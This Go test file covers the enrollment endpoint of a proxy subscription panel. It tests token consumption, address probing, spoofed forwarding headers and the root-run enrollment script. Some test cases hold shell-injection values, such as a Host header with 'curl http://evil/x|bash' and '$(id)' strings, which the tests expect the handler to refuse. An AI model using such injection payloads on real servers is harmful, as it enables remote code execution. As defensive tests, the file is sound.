package handler

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/gin-gonic/gin"

	"github.com/KazuhaHub/passwall-sub-panel/internal/domain"
	"github.com/KazuhaHub/passwall-sub-panel/internal/ports"
)

// Enrollment is an UNAUTHENTICATED endpoint that ends in a stored panel
// credential and a script run as root. The cases below are the ones where
// getting it wrong is expensive rather than merely broken.

type fakeTokens struct {
	ports.AuthTokenRepo
	mu       sync.Mutex
	created  []*domain.AuthToken
	consumed []string
	live     map[string]bool
}

func (f *fakeTokens) Create(_ context.Context, t *domain.AuthToken) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.created = append(f.created, t)
	if f.live == nil {
		f.live = map[string]bool{}
	}
	f.live[t.TokenHash] = true
	return nil
}

func (f *fakeTokens) ConsumeByTokenHash(_ context.Context, purpose, hash string, _ time.Time) (*domain.AuthToken, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.consumed = append(f.consumed, hash)
	if purpose != domain.NodeEnrollPurpose || !f.live[hash] {
		return nil, domain.ErrNotFound
	}
	delete(f.live, hash) // single use
	return &domain.AuthToken{UserID: 1, Purpose: purpose}, nil
}

type fakePanels struct {
	ports.XUIPanelRepo
	mu    sync.Mutex
	saved []*domain.XUIPanel
}

func (f *fakePanels) Save(_ context.Context, p *domain.XUIPanel) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	p.ID = int64(len(f.saved) + 1)
	f.saved = append(f.saved, p)
	return nil
}
func (f *fakePanels) Delete(context.Context, int64) error { return nil }

type fakePool struct {
	ports.XUIPool
	added int
}

func (f *fakePool) Add(*domain.Panel) error { f.added++; return nil }

// probeOnly answers for exactly one URL and fails for every other, which is
// how a real fleet behaves: one of the node's addresses routes and the rest
// time out.
func probeOnly(ok string) func(context.Context, *domain.XUIPanel) (*ports.ServerStatus, error) {
	return func(_ context.Context, p *domain.XUIPanel) (*ports.ServerStatus, error) {
		if p.URL == ok {
			return &ports.ServerStatus{PanelVersion: "3.7.0", XrayVersion: "26.7.28"}, nil
		}
		return nil, errors.New("dial tcp: i/o timeout")
	}
}

func enrollRouter(h *NodeEnrollHandler) *gin.Engine {
	gin.SetMode(gin.TestMode)
	g := gin.New()
	g.GET("/enroll/:token", h.Script)
	g.POST("/api/enroll/:token", h.Callback)
	return g
}

const goodToken = "MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYg"

func callback(t *testing.T, g *gin.Engine, token string, body map[string]any, remote string) *httptest.ResponseRecorder {
	t.Helper()
	b, _ := json.Marshal(body)
	req := httptest.NewRequest(http.MethodPost, "/api/enroll/"+token, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	req.RemoteAddr = remote
	w := httptest.NewRecorder()
	g.ServeHTTP(w, req)
	return w
}

func baseBody() map[string]any {
	return map[string]any{
		"scheme": "http", "port": 54321, "base_path": "/",
		"api_token": "tok", "hostname": "tokyo-1",
		"addresses": []string{"10.0.0.9"},
	}
}

// The whole point of the feature: PSP tries the node's addresses and keeps the
// one that answers, instead of asking a human to pick.
func TestEnrollCallback_RegistersTheAddressThatAnswers(t *testing.T) {
	tok := &fakeTokens{}
	_ = tok.Create(context.Background(), &domain.AuthToken{TokenHash: hashEnrollToken(goodToken), Purpose: domain.NodeEnrollPurpose})
	panels, pool := &fakePanels{}, &fakePool{}
	h := NewNodeEnrollHandler(tok, panels, pool, probeOnly("http://10.0.0.9:54321"))

	w := callback(t, enrollRouter(h), goodToken, baseBody(), "198.51.100.4:9999")
	if w.Code != http.StatusCreated {
		t.Fatalf("code = %d, body %s", w.Code, w.Body.String())
	}
	if len(panels.saved) != 1 || panels.saved[0].URL != "http://10.0.0.9:54321" {
		t.Fatalf("saved = %+v", panels.saved)
	}
	if panels.saved[0].AuthMethod != domain.XUIAuthToken {
		t.Fatal("an enrolled panel must be token-auth: password mode is broken on 3.7.0")
	}
	if pool.added != 1 {
		t.Fatalf("pool.added = %d", pool.added)
	}
	// The node's own hostname, not a generic label: a server list of "node,
	// node, node" is unusable, and the hostname is the operator's own word for
	// the machine.
	if panels.saved[0].Name != "tokyo-1" {
		t.Fatalf("name = %q, want the reported hostname", panels.saved[0].Name)
	}
}

// Nothing may be stored until an address has answered. A panel row that cannot
// be reached looks configured, so the operator debugs the panel rather than
// the firewall between them.
func TestEnrollCallback_StoresNothingWhenNoAddressAnswers(t *testing.T) {
	tok := &fakeTokens{}
	_ = tok.Create(context.Background(), &domain.AuthToken{TokenHash: hashEnrollToken(goodToken), Purpose: domain.NodeEnrollPurpose})
	panels, pool := &fakePanels{}, &fakePool{}
	h := NewNodeEnrollHandler(tok, panels, pool, probeOnly("http://nothing:1"))

	w := callback(t, enrollRouter(h), goodToken, baseBody(), "198.51.100.4:9999")
	if w.Code != http.StatusBadGateway {
		t.Fatalf("code = %d, want 502; body %s", w.Code, w.Body.String())
	}
	if len(panels.saved) != 0 || pool.added != 0 {
		t.Fatal("a panel was stored despite nothing answering")
	}
	// The reply has to name what was tried: the fix is a topology question and
	// the operator cannot answer it blind.
	if !strings.Contains(w.Body.String(), "10.0.0.9") {
		t.Fatalf("the failure does not say which addresses were tried: %s", w.Body.String())
	}
}

// Single-use, and spent on presentation. If a failed probe left the token
// live, anyone holding the one-liner could retry it indefinitely.
func TestEnrollCallback_TokenIsConsumedEvenWhenEnrollmentFails(t *testing.T) {
	tok := &fakeTokens{}
	_ = tok.Create(context.Background(), &domain.AuthToken{TokenHash: hashEnrollToken(goodToken), Purpose: domain.NodeEnrollPurpose})
	h := NewNodeEnrollHandler(tok, &fakePanels{}, &fakePool{}, probeOnly("http://nothing:1"))
	g := enrollRouter(h)

	if w := callback(t, g, goodToken, baseBody(), "198.51.100.4:9999"); w.Code != http.StatusBadGateway {
		t.Fatalf("first call code = %d", w.Code)
	}
	w := callback(t, g, goodToken, baseBody(), "198.51.100.4:9999")
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("replay code = %d, want 401 — the token survived a failed enrollment", w.Code)
	}
}

func TestEnrollCallback_RejectsUnknownToken(t *testing.T) {
	h := NewNodeEnrollHandler(&fakeTokens{}, &fakePanels{}, &fakePool{}, probeOnly("http://10.0.0.9:54321"))
	w := callback(t, enrollRouter(h), goodToken, baseBody(), "198.51.100.4:9999")
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("code = %d, want 401", w.Code)
	}
}

// The observed address is used to build a URL PSP will dial back, so it must
// come from the actual peer rather than from forwarding headers — those are
// caller-controlled under a permissive trusted_proxies, and even honest ones
// name a proxy's client rather than a routable host.
func TestEnrollCallback_IgnoresForwardingHeadersForTheObservedAddress(t *testing.T) {
	tok := &fakeTokens{}
	_ = tok.Create(context.Background(), &domain.AuthToken{TokenHash: hashEnrollToken(goodToken), Purpose: domain.NodeEnrollPurpose})
	panels := &fakePanels{}
	// The spoofed address must be one the dial policy ALLOWS, or this passes
	// for the wrong reason: a documentation range (203.0.113.0/24 and friends)
	// is filtered out before any probe, so the test would stay green even if
	// the handler did trust the header. 8.8.4.4 is ordinary public space.
	const spoofed = "8.8.4.4"
	h := NewNodeEnrollHandler(tok, panels, &fakePool{}, probeOnly("http://"+spoofed+":54321"))

	b, _ := json.Marshal(baseBody())
	req := httptest.NewRequest(http.MethodPost, "/api/enroll/"+goodToken, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Forwarded-For", spoofed)
	req.Header.Set("X-Real-IP", spoofed)
	req.RemoteAddr = "10.0.0.1:9999" // the real peer, and the only honest answer
	w := httptest.NewRecorder()
	enrollRouter(h).ServeHTTP(w, req)

	if len(panels.saved) != 0 {
		t.Fatalf("a forged forwarding header steered enrollment to %q", panels.saved[0].URL)
	}
}

// The other half of the same contract: the peer address IS used, and is tried
// before the node's self-reported ones. Without this, a handler that ignored
// the observed address entirely would also pass the test above.
func TestEnrollCallback_PrefersTheAddressPSPSawTheCallbackFrom(t *testing.T) {
	tok := &fakeTokens{}
	_ = tok.Create(context.Background(), &domain.AuthToken{TokenHash: hashEnrollToken(goodToken), Purpose: domain.NodeEnrollPurpose})
	panels := &fakePanels{}
	// Both addresses answer; the observed one must win.
	h := NewNodeEnrollHandler(tok, panels, &fakePool{}, func(_ context.Context, p *domain.XUIPanel) (*ports.ServerStatus, error) {
		return &ports.ServerStatus{PanelVersion: "3.7.0"}, nil
	})

	w := callback(t, enrollRouter(h), goodToken, baseBody(), "10.0.0.1:9999")
	if w.Code != http.StatusCreated {
		t.Fatalf("code = %d, body %s", w.Code, w.Body.String())
	}
	if got := panels.saved[0].URL; got != "http://10.0.0.1:54321" {
		t.Fatalf("enrolled %q, want the observed peer address to win", got)
	}
}

func TestEnrollCallback_RejectsMissingAPIToken(t *testing.T) {
	tok := &fakeTokens{}
	_ = tok.Create(context.Background(), &domain.AuthToken{TokenHash: hashEnrollToken(goodToken), Purpose: domain.NodeEnrollPurpose})
	h := NewNodeEnrollHandler(tok, &fakePanels{}, &fakePool{}, probeOnly("http://10.0.0.9:54321"))
	body := baseBody()
	body["api_token"] = ""
	if w := callback(t, enrollRouter(h), goodToken, body, "198.51.100.4:9999"); w.Code != http.StatusBadRequest {
		t.Fatalf("code = %d, want 400", w.Code)
	}
	if len(tok.consumed) != 0 {
		t.Fatal("a malformed request burned the token")
	}
}

// ---- the script route ----

// The response is executed as root and the Host header is caller-controlled,
// so an origin that cannot be represented safely is refused rather than
// escaped. Without this, `Host: x'; curl evil|bash; :'` is reflected into an
// executable.
func TestEnrollScript_RefusesAnUnsafeHost(t *testing.T) {
	h := NewNodeEnrollHandler(&fakeTokens{}, &fakePanels{}, &fakePool{}, probeOnly(""))
	req := httptest.NewRequest(http.MethodGet, "/enroll/"+goodToken, nil)
	req.Host = "evil.example.com'; curl http://evil/x|bash; :'"
	w := httptest.NewRecorder()
	enrollRouter(h).ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("code = %d, want 400", w.Code)
	}
	if strings.Contains(w.Body.String(), "curl http://evil") {
		t.Fatal("the injected command was reflected into the script body")
	}
}

func TestEnrollBaseAllowed(t *testing.T) {
	for _, ok := range []string{
		"https://psp.example.com", "http://psp.example.com:8788",
		"http://10.0.0.5:8788", "https://[2001:db8::1]:8788", "http://localhost:8788",
	} {
		if !EnrollBaseAllowed(ok) {
			t.Fatalf("%q should be allowed", ok)
		}
	}
	for _, bad := range []string{
		"http://x'; curl evil|bash; :'", "http://a b", `http://a\nb`,
		"ftp://psp.example.com", "psp.example.com", "http://x$(id)", "http://x`id`",
		"http://x;y", "http://x|y", "http://x&y", "http://x'y",
	} {
		if EnrollBaseAllowed(bad) {
			t.Fatalf("%q must be refused — it ends up inside a root-executed script", bad)
		}
	}
}

func TestEnrollScript_RejectsMalformedToken(t *testing.T) {
	h := NewNodeEnrollHandler(&fakeTokens{}, &fakePanels{}, &fakePool{}, probeOnly(""))
	for _, bad := range []string{"short", "semi;colon;tokenvalue123456", "dots.are.not.allowed.in.a.token"} {
		req := httptest.NewRequest(http.MethodGet, "/enroll/"+bad, nil)
		req.Host = "psp.example.com"
		w := httptest.NewRecorder()
		enrollRouter(h).ServeHTTP(w, req)
		if w.Code == http.StatusOK && strings.Contains(w.Body.String(), bad) {
			t.Fatalf("%q was interpolated into the script", bad)
		}
	}
}

// The served script must carry the values the node needs, single-quoted.
func TestEnrollScript_EmbedsBaseAndToken(t *testing.T) {
	h := NewNodeEnrollHandler(&fakeTokens{}, &fakePanels{}, &fakePool{}, probeOnly(""))
	req := httptest.NewRequest(http.MethodGet, "/enroll/"+goodToken, nil)
	req.Host = "psp.example.com:8788"
	w := httptest.NewRecorder()
	enrollRouter(h).ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("code = %d", w.Code)
	}
	body := w.Body.String()
	if !strings.Contains(body, "PSP_BASE='http://psp.example.com:8788'") {
		t.Fatalf("base not embedded single-quoted:\n%s", body[:200])
	}
	if !strings.Contains(body, "ENROLL_TOKEN='"+goodToken+"'") {
		t.Fatal("token not embedded single-quoted")
	}
}

// Nil probe means the build cannot enrol. Answering 503 keeps "not wired" and
// "your node is unreachable" apart — they have completely different fixes.
func TestEnroll_UnwiredBuildSaysSo(t *testing.T) {
	h := NewNodeEnrollHandler(&fakeTokens{}, &fakePanels{}, &fakePool{}, nil)
	if w := callback(t, enrollRouter(h), goodToken, baseBody(), "198.51.100.4:9999"); w.Code != http.StatusServiceUnavailable {
		t.Fatalf("code = %d, want 503", w.Code)
	}
}
